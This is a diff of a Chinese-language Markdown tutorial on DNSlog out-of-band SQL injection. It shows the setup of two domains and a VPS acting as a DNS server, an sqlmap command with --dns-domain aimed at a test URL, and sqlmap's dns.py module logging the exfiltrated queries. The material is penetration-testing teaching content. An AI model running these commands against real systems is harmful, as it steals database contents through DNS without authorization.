@@ -117,37 +117,39 @@ SELECT temp_function();
 ```
 
 ### SQLMap配合DNSlog
-&emsp;SQLmap也支持dnslog注入，就是给一个域名，然后SQLmap就会把语句里面的域名换成我们自己定义的，所以我们也可以用dnslog平台，当然网络上免费的dnslog平台一般都会有条目限制，所以我们最好还自己整dnslog平台，或者自己注册一个域名服务器，把请求指向我们的域名服务器就可以了。
+&emsp;SQLmap也支持dnslog注入，就是给一个域名，然后SQLmap就会把语句里面的域名换成我们自己定义的，所以我们也可以用dnslog平台，当然网络上免费的dnslog平台一般都会有条目限制，所以我们最好还自己整dnslog平台，或者自己注册一个DNS服务器域名，把请求指向我们的DNS服务器就可以了。
 
 **材料准备：**
 * 域名两个
-* 外网VPS一台（Ubuntu，作为域名服务器）
+* 外网VPS一台（Ubuntu，作为DNS服务器）
 
 我准备的域名是：52stu.me(注入语句的时候用的)、52stu.org(接收解析请求)
 
 我准备的VPS是：Ubuntu 18.04，测试的时候Debian 9 x64 失败。
 
 **跟着操作：**
-1. 把52stu.org注册为DNS服务器，，并增加一条A记录，主机头为：`*`，指向VPS。
+1. 把52stu.org注册为DNS服务器，并增加一条A记录，主机头为：`*`，指向VPS。
     ```
     ns1.52stu.org
     ns2.52stu.org
     ```
 2. 把52stu.me的域名服务器设置成为52stu.org的DNS服务器域名。
-3. 在VPS下载sqlmap并启动sqlmap目录下的`dns.py`，目录为：`lib/request`。
-4. 任意机器启动SQLmap注入：`sqlmap -u "http://vul.dark5.net/vul.php?id=1" --dns-domain=52stu.me`
-5. 结果就会出现在VPS上。
-    ```
-    root@vultr:~/sqlmap/lib/request# python dns.py
-    [i] 21111.52stu.me.
-    [i] 21111.52stu.me.
-    [i] 52stu.me.
-    [i] 2222.52stu.me.
-    [i] 2222.52stu.me.
-    [i] 222.52stu.me.
-    [i] 2x22.52stu.me.
-    [i] 52stu.me.
-    ```
+3. 在该VPS启动SQLmap注入：`sqlmap -u "http://vul.dark5.net/vul.php?id=1" --dns-domain=52stu.me`
+
+**不使用SQLMap注入**
+*如果不想使用SQLmap注入，在现有环境下，我们可以只使用SQLmap的一个模块，是接收dns请求并做处理的模块来接收请求过来的数据。*
+&emsp;在该VPS下载sqlmap并启动sqlmap目录下的`dns.py`，目录为：`lib/request`。
+```
+root@vultr:~/sqlmap/lib/request# python dns.py
+[i] 21111.52stu.me.
+[i] 21111.52stu.me.
+[i] 52stu.me.
+[i] 2222.52stu.me.
+[i] 2222.52stu.me.
+[i] 222.52stu.me.
+[i] 2x22.52stu.me.
+[i] 52stu.me.
+```
 
 
 ### 命令执行
